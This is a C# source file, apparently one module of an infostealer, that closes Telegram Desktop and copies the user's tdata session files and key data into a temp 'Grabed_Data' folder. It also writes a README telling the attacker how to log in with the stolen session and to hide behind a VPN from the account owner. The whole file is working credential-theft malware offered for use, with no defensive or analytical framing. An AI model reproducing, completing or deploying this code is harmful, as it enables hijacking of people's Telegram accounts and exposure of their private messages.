namespace Vollmond.messengers
{
    internal class StealTelegram
    {
        public static string tdata_path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop", "tdata"); // C:\Users\User\AppData\Roaming\Telegram Desktop\tdata
        public static string key_datas = Path.Combine(tdata_path, "key_datas");
        public static string settings = Path.Combine(tdata_path, "settings");
        public static string usertag = Path.Combine(tdata_path, "usertag");
        public static void StealSession() // Return null if needed files or tdata doesnt exists
        {
            if (Auxiliary_payload.IsTelegramDesktopDirectoryExists(tdata_path))
            {
                try
                {
                    Auxiliary_payload.KillTelegram();

                    if (File.Exists(Path.Combine(Path.GetTempPath(), "tg_session.zip")))
                        File.Delete(Path.Combine(Path.GetTempPath(), "tg_session.zip"));

                    string[] Alldirectories = Directory.GetDirectories(tdata_path);
                    string fullpath = Path.Combine(tdata_path, "D877F783D5D3EF8C");
                    string D877_folder_name = "D877F783D5D3EF8C";

                    foreach (string dir in Alldirectories)
                    {
                        string name = Path.GetFileName(dir);

                        if (name.StartsWith("D877") && !name.EndsWith("s"))
                        {
                            D877_folder_name = name;
                            fullpath = Path.Combine(tdata_path, name);
                            break;
                        }
                        D877_folder_name = name;
                    }

                    string grabed_tdata_directory_path = Path.Combine(Path.GetTempPath(), "Grabed_Data", "Telegram");
                    string manual = Path.Combine(grabed_tdata_directory_path, "README.md");
                    string D877 = Path.Combine(grabed_tdata_directory_path, D877_folder_name);
                    string D877s = Path.Combine(tdata_path, "D877F783D5D3EF8Cs");

                    Directory.CreateDirectory(grabed_tdata_directory_path);
                    Directory.CreateDirectory(D877);

                    File.WriteAllText(manual,
                        """
                         # How to using the session files 

                         1. Take all files and folders
                         2. Open your tdata directory and move all files and folder from this directory (without this file) with replacing all files.
                         3. Open your telegram desktop, and u see what all id done! You are signed in session!

                         > Use a VPN when logging in/using a session. Your IP address is displayed in the account owner's session list.
                        """);

                    string[] filesForGrub = { "usertag", "key_datas", "settingss", D877s };

                    foreach (string file in filesForGrub)
                    {
                        if (File.Exists(file))
                        {
                            File.Copy(file, Path.Combine(grabed_tdata_directory_path, Path.GetFileName(file)), true);
                        }
                    }


                    string[] allD877folder_files = Directory.GetFiles(fullpath);
                    foreach (string file in allD877folder_files)
                    {
                        try
                        {
                            File.Copy(file, Path.Combine(D877, Path.GetFileName(file)));
                        }
                        catch { }
                    }
                }
                catch
                {
                }
            }
        }
    }
}
